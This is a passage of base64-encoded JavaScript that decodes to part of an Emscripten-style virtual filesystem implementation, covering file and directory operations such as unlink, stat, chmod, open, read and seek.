XI6ZnVuY3Rpb24ocGF0aCkgew0KICAgICAgICB2YXIgbG9va3VwID0gRlMubG9va3VwUGF0aChwYXRoLCB7IHBhcmVudDogdHJ1ZSB9KTsNCiAgICAgICAgdmFyIHBhcmVudCA9IGxvb2t1cC5ub2RlOw0KICAgICAgICB2YXIgbmFtZSA9IFBBVEguYmFzZW5hbWUocGF0aCk7DQogICAgICAgIHZhciBub2RlID0gRlMubG9va3VwTm9kZShwYXJlbnQsIG5hbWUpOw0KICAgICAgICB2YXIgZXJyQ29kZSA9IEZTLm1heURlbGV0ZShwYXJlbnQsIG5hbWUsIHRydWUpOw0KICAgICAgICBpZiAoZXJyQ29kZSkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKGVyckNvZGUpOw0KICAgICAgICB9DQogICAgICAgIGlmICghcGFyZW50Lm5vZGVfb3BzLnJtZGlyKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoNjMpOw0KICAgICAgICB9DQogICAgICAgIGlmIChGUy5pc01vdW50cG9pbnQobm9kZSkpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcigxMCk7DQogICAgICAgIH0NCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICBpZiAoRlMudHJhY2tpbmdEZWxlZ2F0ZVsnd2lsbERlbGV0ZVBhdGgnXSkgew0KICAgICAgICAgICAgRlMudHJhY2tpbmdEZWxlZ2F0ZVsnd2lsbERlbGV0ZVBhdGgnXShwYXRoKTsNCiAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2goZSkgew0KICAgICAgICAgIGVycigiRlMudHJhY2tpbmdEZWxlZ2F0ZVsnd2lsbERlbGV0ZVBhdGgnXSgnIitwYXRoKyInKSB0aHJldyBhbiBleGNlcHRpb246ICIgKyBlLm1lc3NhZ2UpOw0KICAgICAgICB9DQogICAgICAgIHBhcmVudC5ub2RlX29wcy5ybWRpcihwYXJlbnQsIG5hbWUpOw0KICAgICAgICBGUy5kZXN0cm95Tm9kZShub2RlKTsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICBpZiAoRlMudHJhY2tpbmdEZWxlZ2F0ZVsnb25EZWxldGVQYXRoJ10pIEZTLnRyYWNraW5nRGVsZWdhdGVbJ29uRGVsZXRlUGF0aCddKHBhdGgpOw0KICAgICAgICB9IGNhdGNoKGUpIHsNCiAgICAgICAgICBlcnIoIkZTLnRyYWNraW5nRGVsZWdhdGVbJ29uRGVsZXRlUGF0aCddKCciK3BhdGgrIicpIHRocmV3IGFuIGV4Y2VwdGlvbjogIiArIGUubWVzc2FnZSk7DQogICAgICAgIH0NCiAgICAgIH0scmVhZGRpcjpmdW5jdGlvbihwYXRoKSB7DQogICAgICAgIHZhciBsb29rdXAgPSBGUy5sb29rdXBQYXRoKHBhdGgsIHsgZm9sbG93OiB0cnVlIH0pOw0KICAgICAgICB2YXIgbm9kZSA9IGxvb2t1cC5ub2RlOw0KICAgICAgICBpZiAoIW5vZGUubm9kZV9vcHMucmVhZGRpcikgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDU0KTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gbm9kZS5ub2RlX29wcy5yZWFkZGlyKG5vZGUpOw0KICAgICAgfSx1bmxpbms6ZnVuY3Rpb24ocGF0aCkgew0KICAgICAgICB2YXIgbG9va3VwID0gRlMubG9va3VwUGF0aChwYXRoLCB7IHBhcmVudDogdHJ1ZSB9KTsNCiAgICAgICAgdmFyIHBhcmVudCA9IGxvb2t1cC5ub2RlOw0KICAgICAgICB2YXIgbmFtZSA9IFBBVEguYmFzZW5hbWUocGF0aCk7DQogICAgICAgIHZhciBub2RlID0gRlMubG9va3VwTm9kZShwYXJlbnQsIG5hbWUpOw0KICAgICAgICB2YXIgZXJyQ29kZSA9IEZTLm1heURlbGV0ZShwYXJlbnQsIG5hbWUsIGZhbHNlKTsNCiAgICAgICAgaWYgKGVyckNvZGUpIHsNCiAgICAgICAgICAvLyBBY2NvcmRpbmcgdG8gUE9TSVgsIHdlIHNob3VsZCBtYXAgRUlTRElSIHRvIEVQRVJNLCBidXQNCiAgICAgICAgICAvLyB3ZSBpbnN0ZWFkIGRvIHdoYXQgTGludXggZG9lcyAoYW5kIHdlIG11c3QsIGFzIHdlIHVzZQ0KICAgICAgICAgIC8vIHRoZSBtdXNsIGxpbnV4IGxpYmMpLg0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKGVyckNvZGUpOw0KICAgICAgICB9DQogICAgICAgIGlmICghcGFyZW50Lm5vZGVfb3BzLnVubGluaykgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDYzKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoRlMuaXNNb3VudHBvaW50KG5vZGUpKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoMTApOw0KICAgICAgICB9DQogICAgICAgIHRyeSB7DQogICAgICAgICAgaWYgKEZTLnRyYWNraW5nRGVsZWdhdGVbJ3dpbGxEZWxldGVQYXRoJ10pIHsNCiAgICAgICAgICAgIEZTLnRyYWNraW5nRGVsZWdhdGVbJ3dpbGxEZWxldGVQYXRoJ10ocGF0aCk7DQogICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoKGUpIHsNCiAgICAgICAgICBlcnIoIkZTLnRyYWNraW5nRGVsZWdhdGVbJ3dpbGxEZWxldGVQYXRoJ10oJyIrcGF0aCsiJykgdGhyZXcgYW4gZXhjZXB0aW9uOiAiICsgZS5tZXNzYWdlKTsNCiAgICAgICAgfQ0KICAgICAgICBwYXJlbnQubm9kZV9vcHMudW5saW5rKHBhcmVudCwgbmFtZSk7DQogICAgICAgIEZTLmRlc3Ryb3lOb2RlKG5vZGUpOw0KICAgICAgICB0cnkgew0KICAgICAgICAgIGlmIChGUy50cmFja2luZ0RlbGVnYXRlWydvbkRlbGV0ZVBhdGgnXSkgRlMudHJhY2tpbmdEZWxlZ2F0ZVsnb25EZWxldGVQYXRoJ10ocGF0aCk7DQogICAgICAgIH0gY2F0Y2goZSkgew0KICAgICAgICAgIGVycigiRlMudHJhY2tpbmdEZWxlZ2F0ZVsnb25EZWxldGVQYXRoJ10oJyIrcGF0aCsiJykgdGhyZXcgYW4gZXhjZXB0aW9uOiAiICsgZS5tZXNzYWdlKTsNCiAgICAgICAgfQ0KICAgICAgfSxyZWFkbGluazpmdW5jdGlvbihwYXRoKSB7DQogICAgICAgIHZhciBsb29rdXAgPSBGUy5sb29rdXBQYXRoKHBhdGgpOw0KICAgICAgICB2YXIgbGluayA9IGxvb2t1cC5ub2RlOw0KICAgICAgICBpZiAoIWxpbmspIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcig0NCk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFsaW5rLm5vZGVfb3BzLnJlYWRsaW5rKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoMjgpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBQQVRIX0ZTLnJlc29sdmUoRlMuZ2V0UGF0aChsaW5rLnBhcmVudCksIGxpbmsubm9kZV9vcHMucmVhZGxpbmsobGluaykpOw0KICAgICAgfSxzdGF0OmZ1bmN0aW9uKHBhdGgsIGRvbnRGb2xsb3cpIHsNCiAgICAgICAgdmFyIGxvb2t1cCA9IEZTLmxvb2t1cFBhdGgocGF0aCwgeyBmb2xsb3c6ICFkb250Rm9sbG93IH0pOw0KICAgICAgICB2YXIgbm9kZSA9IGxvb2t1cC5ub2RlOw0KICAgICAgICBpZiAoIW5vZGUpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcig0NCk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFub2RlLm5vZGVfb3BzLmdldGF0dHIpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcig2Myk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIG5vZGUubm9kZV9vcHMuZ2V0YXR0cihub2RlKTsNCiAgICAgIH0sbHN0YXQ6ZnVuY3Rpb24ocGF0aCkgew0KICAgICAgICByZXR1cm4gRlMuc3RhdChwYXRoLCB0cnVlKTsNCiAgICAgIH0sY2htb2Q6ZnVuY3Rpb24ocGF0aCwgbW9kZSwgZG9udEZvbGxvdykgew0KICAgICAgICB2YXIgbm9kZTsNCiAgICAgICAgaWYgKHR5cGVvZiBwYXRoID09PSAnc3RyaW5nJykgew0KICAgICAgICAgIHZhciBsb29rdXAgPSBGUy5sb29rdXBQYXRoKHBhdGgsIHsgZm9sbG93OiAhZG9udEZvbGxvdyB9KTsNCiAgICAgICAgICBub2RlID0gbG9va3VwLm5vZGU7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgbm9kZSA9IHBhdGg7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFub2RlLm5vZGVfb3BzLnNldGF0dHIpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcig2Myk7DQogICAgICAgIH0NCiAgICAgICAgbm9kZS5ub2RlX29wcy5zZXRhdHRyKG5vZGUsIHsNCiAgICAgICAgICBtb2RlOiAobW9kZSAmIDQwOTUpIHwgKG5vZGUubW9kZSAmIH40MDk1KSwNCiAgICAgICAgICB0aW1lc3RhbXA6IERhdGUubm93KCkNCiAgICAgICAgfSk7DQogICAgICB9LGxjaG1vZDpmdW5jdGlvbihwYXRoLCBtb2RlKSB7DQogICAgICAgIEZTLmNobW9kKHBhdGgsIG1vZGUsIHRydWUpOw0KICAgICAgfSxmY2htb2Q6ZnVuY3Rpb24oZmQsIG1vZGUpIHsNCiAgICAgICAgdmFyIHN0cmVhbSA9IEZTLmdldFN0cmVhbShmZCk7DQogICAgICAgIGlmICghc3RyZWFtKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoOCk7DQogICAgICAgIH0NCiAgICAgICAgRlMuY2htb2Qoc3RyZWFtLm5vZGUsIG1vZGUpOw0KICAgICAgfSxjaG93bjpmdW5jdGlvbihwYXRoLCB1aWQsIGdpZCwgZG9udEZvbGxvdykgew0KICAgICAgICB2YXIgbm9kZTsNCiAgICAgICAgaWYgKHR5cGVvZiBwYXRoID09PSAnc3RyaW5nJykgew0KICAgICAgICAgIHZhciBsb29rdXAgPSBGUy5sb29rdXBQYXRoKHBhdGgsIHsgZm9sbG93OiAhZG9udEZvbGxvdyB9KTsNCiAgICAgICAgICBub2RlID0gbG9va3VwLm5vZGU7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgbm9kZSA9IHBhdGg7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCFub2RlLm5vZGVfb3BzLnNldGF0dHIpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcig2Myk7DQogICAgICAgIH0NCiAgICAgICAgbm9kZS5ub2RlX29wcy5zZXRhdHRyKG5vZGUsIHsNCiAgICAgICAgICB0aW1lc3RhbXA6IERhdGUubm93KCkNCiAgICAgICAgICAvLyB3ZSBpZ25vcmUgdGhlIHVpZCAvIGdpZCBmb3Igbm93DQogICAgICAgIH0pOw0KICAgICAgfSxsY2hvd246ZnVuY3Rpb24ocGF0aCwgdWlkLCBnaWQpIHsNCiAgICAgICAgRlMuY2hvd24ocGF0aCwgdWlkLCBnaWQsIHRydWUpOw0KICAgICAgfSxmY2hvd246ZnVuY3Rpb24oZmQsIHVpZCwgZ2lkKSB7DQogICAgICAgIHZhciBzdHJlYW0gPSBGUy5nZXRTdHJlYW0oZmQpOw0KICAgICAgICBpZiAoIXN0cmVhbSkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDgpOw0KICAgICAgICB9DQogICAgICAgIEZTLmNob3duKHN0cmVhbS5ub2RlLCB1aWQsIGdpZCk7DQogICAgICB9LHRydW5jYXRlOmZ1bmN0aW9uKHBhdGgsIGxlbikgew0KICAgICAgICBpZiAobGVuIDwgMCkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDI4KTsNCiAgICAgICAgfQ0KICAgICAgICB2YXIgbm9kZTsNCiAgICAgICAgaWYgKHR5cGVvZiBwYXRoID09PSAnc3RyaW5nJykgew0KICAgICAgICAgIHZhciBsb29rdXAgPSBGUy5sb29rdXBQYXRoKHBhdGgsIHsgZm9sbG93OiB0cnVlIH0pOw0KICAgICAgICAgIG5vZGUgPSBsb29rdXAubm9kZTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICBub2RlID0gcGF0aDsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoIW5vZGUubm9kZV9vcHMuc2V0YXR0cikgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDYzKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoRlMuaXNEaXIobm9kZS5tb2RlKSkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDMxKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoIUZTLmlzRmlsZShub2RlLm1vZGUpKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoMjgpOw0KICAgICAgICB9DQogICAgICAgIHZhciBlcnJDb2RlID0gRlMubm9kZVBlcm1pc3Npb25zKG5vZGUsICd3Jyk7DQogICAgICAgIGlmIChlcnJDb2RlKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoZXJyQ29kZSk7DQogICAgICAgIH0NCiAgICAgICAgbm9kZS5ub2RlX29wcy5zZXRhdHRyKG5vZGUsIHsNCiAgICAgICAgICBzaXplOiBsZW4sDQogICAgICAgICAgdGltZXN0YW1wOiBEYXRlLm5vdygpDQogICAgICAgIH0pOw0KICAgICAgfSxmdHJ1bmNhdGU6ZnVuY3Rpb24oZmQsIGxlbikgew0KICAgICAgICB2YXIgc3RyZWFtID0gRlMuZ2V0U3RyZWFtKGZkKTsNCiAgICAgICAgaWYgKCFzdHJlYW0pIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcig4KTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoKHN0cmVhbS5mbGFncyAmIDIwOTcxNTUpID09PSAwKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoMjgpOw0KICAgICAgICB9DQogICAgICAgIEZTLnRydW5jYXRlKHN0cmVhbS5ub2RlLCBsZW4pOw0KICAgICAgfSx1dGltZTpmdW5jdGlvbihwYXRoLCBhdGltZSwgbXRpbWUpIHsNCiAgICAgICAgdmFyIGxvb2t1cCA9IEZTLmxvb2t1cFBhdGgocGF0aCwgeyBmb2xsb3c6IHRydWUgfSk7DQogICAgICAgIHZhciBub2RlID0gbG9va3VwLm5vZGU7DQogICAgICAgIG5vZGUubm9kZV9vcHMuc2V0YXR0cihub2RlLCB7DQogICAgICAgICAgdGltZXN0YW1wOiBNYXRoLm1heChhdGltZSwgbXRpbWUpDQogICAgICAgIH0pOw0KICAgICAgfSxvcGVuOmZ1bmN0aW9uKHBhdGgsIGZsYWdzLCBtb2RlLCBmZF9zdGFydCwgZmRfZW5kKSB7DQogICAgICAgIGlmIChwYXRoID09PSAiIikgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDQ0KTsNCiAgICAgICAgfQ0KICAgICAgICBmbGFncyA9IHR5cGVvZiBmbGFncyA9PT0gJ3N0cmluZycgPyBGUy5tb2RlU3RyaW5nVG9GbGFncyhmbGFncykgOiBmbGFnczsNCiAgICAgICAgbW9kZSA9IHR5cGVvZiBtb2RlID09PSAndW5kZWZpbmVkJyA/IDQzOCAvKiAwNjY2ICovIDogbW9kZTsNCiAgICAgICAgaWYgKChmbGFncyAmIDY0KSkgew0KICAgICAgICAgIG1vZGUgPSAobW9kZSAmIDQwOTUpIHwgMzI3Njg7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgbW9kZSA9IDA7DQogICAgICAgIH0NCiAgICAgICAgdmFyIG5vZGU7DQogICAgICAgIGlmICh0eXBlb2YgcGF0aCA9PT0gJ29iamVjdCcpIHsNCiAgICAgICAgICBub2RlID0gcGF0aDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICBwYXRoID0gUEFUSC5ub3JtYWxpemUocGF0aCk7DQogICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIHZhciBsb29rdXAgPSBGUy5sb29rdXBQYXRoKHBhdGgsIHsNCiAgICAgICAgICAgICAgZm9sbG93OiAhKGZsYWdzICYgMTMxMDcyKQ0KICAgICAgICAgICAgfSk7DQogICAgICAgICAgICBub2RlID0gbG9va3VwLm5vZGU7DQogICAgICAgICAgfSBjYXRjaCAoZSkgew0KICAgICAgICAgICAgLy8gaWdub3JlDQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIC8vIHBlcmhhcHMgd2UgbmVlZCB0byBjcmVhdGUgdGhlIG5vZGUNCiAgICAgICAgdmFyIGNyZWF0ZWQgPSBmYWxzZTsNCiAgICAgICAgaWYgKChmbGFncyAmIDY0KSkgew0KICAgICAgICAgIGlmIChub2RlKSB7DQogICAgICAgICAgICAvLyBpZiBPX0NSRUFUIGFuZCBPX0VYQ0wgYXJlIHNldCwgZXJyb3Igb3V0IGlmIHRoZSBub2RlIGFscmVhZHkgZXhpc3RzDQogICAgICAgICAgICBpZiAoKGZsYWdzICYgMTI4KSkgew0KICAgICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcigyMCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIC8vIG5vZGUgZG9lc24ndCBleGlzdCwgdHJ5IHRvIGNyZWF0ZSBpdA0KICAgICAgICAgICAgbm9kZSA9IEZTLm1rbm9kKHBhdGgsIG1vZGUsIDApOw0KICAgICAgICAgICAgY3JlYXRlZCA9IHRydWU7DQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGlmICghbm9kZSkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDQ0KTsNCiAgICAgICAgfQ0KICAgICAgICAvLyBjYW4ndCB0cnVuY2F0ZSBhIGRldmljZQ0KICAgICAgICBpZiAoRlMuaXNDaHJkZXYobm9kZS5tb2RlKSkgew0KICAgICAgICAgIGZsYWdzICY9IH41MTI7DQogICAgICAgIH0NCiAgICAgICAgLy8gaWYgYXNrZWQgb25seSBmb3IgYSBkaXJlY3RvcnksIHRoZW4gdGhpcyBtdXN0IGJlIG9uZQ0KICAgICAgICBpZiAoKGZsYWdzICYgNjU1MzYpICYmICFGUy5pc0Rpcihub2RlLm1vZGUpKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoNTQpOw0KICAgICAgICB9DQogICAgICAgIC8vIGNoZWNrIHBlcm1pc3Npb25zLCBpZiB0aGlzIGlzIG5vdCBhIGZpbGUgd2UganVzdCBjcmVhdGVkIG5vdyAoaXQgaXMgb2sgdG8NCiAgICAgICAgLy8gY3JlYXRlIGFuZCB3cml0ZSB0byBhIGZpbGUgd2l0aCByZWFkLW9ubHkgcGVybWlzc2lvbnM7IGl0IGlzIHJlYWQtb25seQ0KICAgICAgICAvLyBmb3IgbGF0ZXIgdXNlKQ0KICAgICAgICBpZiAoIWNyZWF0ZWQpIHsNCiAgICAgICAgICB2YXIgZXJyQ29kZSA9IEZTLm1heU9wZW4obm9kZSwgZmxhZ3MpOw0KICAgICAgICAgIGlmIChlcnJDb2RlKSB7DQogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihlcnJDb2RlKTsNCiAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgLy8gZG8gdHJ1bmNhdGlvbiBpZiBuZWNlc3NhcnkNCiAgICAgICAgaWYgKChmbGFncyAmIDUxMikpIHsNCiAgICAgICAgICBGUy50cnVuY2F0ZShub2RlLCAwKTsNCiAgICAgICAgfQ0KICAgICAgICAvLyB3ZSd2ZSBhbHJlYWR5IGhhbmRsZWQgdGhlc2UsIGRvbid0IHBhc3MgZG93biB0byB0aGUgdW5kZXJseWluZyB2ZnMNCiAgICAgICAgZmxhZ3MgJj0gfigxMjggfCA1MTIgfCAxMzEwNzIpOw0KICANCiAgICAgICAgLy8gcmVnaXN0ZXIgdGhlIHN0cmVhbSB3aXRoIHRoZSBmaWxlc3lzdGVtDQogICAgICAgIHZhciBzdHJlYW0gPSBGUy5jcmVhdGVTdHJlYW0oew0KICAgICAgICAgIG5vZGU6IG5vZGUsDQogICAgICAgICAgcGF0aDogRlMuZ2V0UGF0aChub2RlKSwgIC8vIHdlIHdhbnQgdGhlIGFic29sdXRlIHBhdGggdG8gdGhlIG5vZGUNCiAgICAgICAgICBmbGFnczogZmxhZ3MsDQogICAgICAgICAgc2Vla2FibGU6IHRydWUsDQogICAgICAgICAgcG9zaXRpb246IDAsDQogICAgICAgICAgc3RyZWFtX29wczogbm9kZS5zdHJlYW1fb3BzLA0KICAgICAgICAgIC8vIHVzZWQgYnkgdGhlIGZpbGUgZmFtaWx5IGxpYmMgY2FsbHMgKGZvcGVuLCBmd3JpdGUsIGZlcnJvciwgZXRjLikNCiAgICAgICAgICB1bmdvdHRlbjogW10sDQogICAgICAgICAgZXJyb3I6IGZhbHNlDQogICAgICAgIH0sIGZkX3N0YXJ0LCBmZF9lbmQpOw0KICAgICAgICAvLyBjYWxsIHRoZSBuZXcgc3RyZWFtJ3Mgb3BlbiBmdW5jdGlvbg0KICAgICAgICBpZiAoc3RyZWFtLnN0cmVhbV9vcHMub3Blbikgew0KICAgICAgICAgIHN0cmVhbS5zdHJlYW1fb3BzLm9wZW4oc3RyZWFtKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoTW9kdWxlWydsb2dSZWFkRmlsZXMnXSAmJiAhKGZsYWdzICYgMSkpIHsNCiAgICAgICAgICBpZiAoIUZTLnJlYWRGaWxlcykgRlMucmVhZEZpbGVzID0ge307DQogICAgICAgICAgaWYgKCEocGF0aCBpbiBGUy5yZWFkRmlsZXMpKSB7DQogICAgICAgICAgICBGUy5yZWFkRmlsZXNbcGF0aF0gPSAxOw0KICAgICAgICAgICAgZXJyKCJGUy50cmFja2luZ0RlbGVnYXRlIGVycm9yIG9uIHJlYWQgZmlsZTogIiArIHBhdGgpOw0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICB0cnkgew0KICAgICAgICAgIGlmIChGUy50cmFja2luZ0RlbGVnYXRlWydvbk9wZW5GaWxlJ10pIHsNCiAgICAgICAgICAgIHZhciB0cmFja2luZ0ZsYWdzID0gMDsNCiAgICAgICAgICAgIGlmICgoZmxhZ3MgJiAyMDk3MTU1KSAhPT0gMSkgew0KICAgICAgICAgICAgICB0cmFja2luZ0ZsYWdzIHw9IEZTLnRyYWNraW5nLm9wZW5GbGFncy5SRUFEOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKChmbGFncyAmIDIwOTcxNTUpICE9PSAwKSB7DQogICAgICAgICAgICAgIHRyYWNraW5nRmxhZ3MgfD0gRlMudHJhY2tpbmcub3BlbkZsYWdzLldSSVRFOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgRlMudHJhY2tpbmdEZWxlZ2F0ZVsnb25PcGVuRmlsZSddKHBhdGgsIHRyYWNraW5nRmxhZ3MpOw0KICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaChlKSB7DQogICAgICAgICAgZXJyKCJGUy50cmFja2luZ0RlbGVnYXRlWydvbk9wZW5GaWxlJ10oJyIrcGF0aCsiJywgZmxhZ3MpIHRocmV3IGFuIGV4Y2VwdGlvbjogIiArIGUubWVzc2FnZSk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHN0cmVhbTsNCiAgICAgIH0sY2xvc2U6ZnVuY3Rpb24oc3RyZWFtKSB7DQogICAgICAgIGlmIChGUy5pc0Nsb3NlZChzdHJlYW0pKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoOCk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKHN0cmVhbS5nZXRkZW50cykgc3RyZWFtLmdldGRlbnRzID0gbnVsbDsgLy8gZnJlZSByZWFkZGlyIHN0YXRlDQogICAgICAgIHRyeSB7DQogICAgICAgICAgaWYgKHN0cmVhbS5zdHJlYW1fb3BzLmNsb3NlKSB7DQogICAgICAgICAgICBzdHJlYW0uc3RyZWFtX29wcy5jbG9zZShzdHJlYW0pOw0KICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCAoZSkgew0KICAgICAgICAgIHRocm93IGU7DQogICAgICAgIH0gZmluYWxseSB7DQogICAgICAgICAgRlMuY2xvc2VTdHJlYW0oc3RyZWFtLmZkKTsNCiAgICAgICAgfQ0KICAgICAgICBzdHJlYW0uZmQgPSBudWxsOw0KICAgICAgfSxpc0Nsb3NlZDpmdW5jdGlvbihzdHJlYW0pIHsNCiAgICAgICAgcmV0dXJuIHN0cmVhbS5mZCA9PT0gbnVsbDsNCiAgICAgIH0sbGxzZWVrOmZ1bmN0aW9uKHN0cmVhbSwgb2Zmc2V0LCB3aGVuY2UpIHsNCiAgICAgICAgaWYgKEZTLmlzQ2xvc2VkKHN0cmVhbSkpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcig4KTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoIXN0cmVhbS5zZWVrYWJsZSB8fCAhc3RyZWFtLnN0cmVhbV9vcHMubGxzZWVrKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoNzApOw0KICAgICAgICB9DQogICAgICAgIGlmICh3aGVuY2UgIT0gMCAmJiB3aGVuY2UgIT0gMSAmJiB3aGVuY2UgIT0gMikgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDI4KTsNCiAgICAgICAgfQ0KICAgICAgICBzdHJlYW0ucG9zaXRpb24gPSBzdHJlYW0uc3RyZWFtX29wcy5sbHNlZWsoc3RyZWFtLCBvZmZzZXQsIHdoZW5jZSk7DQogICAgICAgIHN0cmVhbS51bmdvdHRlbiA9IFtdOw0KICAgICAgICByZXR1cm4gc3RyZWFtLnBvc2l0aW9uOw0KICAgICAgfSxyZWFkOmZ1bmN0aW9uKHN0cmVhbSwgYnVmZmVyLCBvZmZzZXQsIGxlbmd0aCwgcG9zaXRpb24pIHsNCiAgICAgICAgaWYgKGxlbmd0aCA8IDAgfHwgcG9zaXRpb24gPCAwKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoMjgpOw0KICAgICAgICB9DQogICAgICAgIGlmIChGUy5pc0Nsb3NlZChzdHJlYW0pKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoOCk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKChzdHJlYW0uZmxhZ3MgJiAyMDk3MTU1KSA9PT0gMSkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDgpOw0KICAgICAgICB9DQogICAgICAgIGlmIChGUy5pc0RpcihzdHJlYW0ubm9kZS5tb2RlKSkgew0KICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDMxKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoIXN0cmVhbS5zdHJlYW1fb3BzLnJlYWQpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcigyOCk7DQogICAgICAgIH0NCiAgICAgICAgdmFyIHNlZWtpbmcgPSB0eXBlb2YgcG9zaXRpb24gIT09ICd1bmRlZmluZWQnOw0KICAgICAgICBpZiAoIXNlZWtpbmcpIHsNCiAgICAgICAgICBwb3NpdGlvbiA9IHN0cmVhbS5wb3NpdGlvbjsNCiAgICAgICAgfSBlbHNlIGlmICghc3RyZWFtLnNlZWthYmxlKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoNzApOw0KICAgICAgICB9DQogICAgICAgIHZhciBieXRlc1JlYWQgPSBzdHJlYW0uc3RyZWFtX29wcy5yZWFkKHN0cmVhbSwgYnVmZmVyLCBvZmZzZXQsIGxlbmd0aCwgcG9zaXRpb24pOw0KICAgICAgICBpZiAoIXNlZWtpbmcpIHN0cmVhbS5wb3NpdGlvbiArPSBieXRlc1JlYWQ7DQogICAgICAgIHJldHVybiBieXRlc1JlYWQ7DQogICAgICB9LHdyaXRlOmZ1bmN0aW9uKHN0cmVhbSwgYnVmZmVyLCBvZmZzZXQsIGxlbmd0aCwgcG9zaXRpb24sIGNhbk93bikgew0KICAgICAgICBpZiAobGVuZ3RoIDwgMCB8fCBwb3NpdGlvbiA8IDApIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcigyOCk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKEZTLmlzQ2xvc2VkKHN0cmVhbSkpIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcig4KTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoKHN0cmVhbS5mbGFncyAmIDIwOTcxNTUpID09PSAwKSB7DQogICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoOCk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKEZTLmlzRGlyKHN0cmVhbS5u